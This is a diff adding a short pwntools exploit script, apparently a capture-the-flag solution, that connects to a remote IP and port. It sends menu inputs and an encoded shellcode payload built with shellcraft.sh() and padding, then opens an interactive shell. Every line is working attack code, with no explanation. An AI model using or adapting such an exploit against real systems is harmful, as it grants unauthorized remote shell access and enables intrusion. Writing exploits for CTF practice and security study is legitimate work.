@@ -1,0 +1,21 @@
+from pwn import *
+
+context.arch = 'amd64'
+p = remote('94.237.61.249', 49579)
+
+shellcode = asm(shellcraft.sh())
+parts = iter([f'{b:x}' for b in shellcode])
+encoded = [chr(int(next(parts, '').rjust(2,'0')+c.rjust(2,'0'),16)).encode() for c in parts]
+
+payload = b''
+payload += chr(0x0101).encode() * 2048
+payload += b''.join(encoded)
+payload += chr(0x00).encode()
+payload += chr(0x0101).encode() * (4001 - 2048 - len(encoded))
+payload += chr(0x11000).encode()
+payload += chr(0x0000).encode()
+
+p.send(b'eliot\n4007\n2\n')
+p.send(payload)
+p.send(b'\n')
+p.interactive()
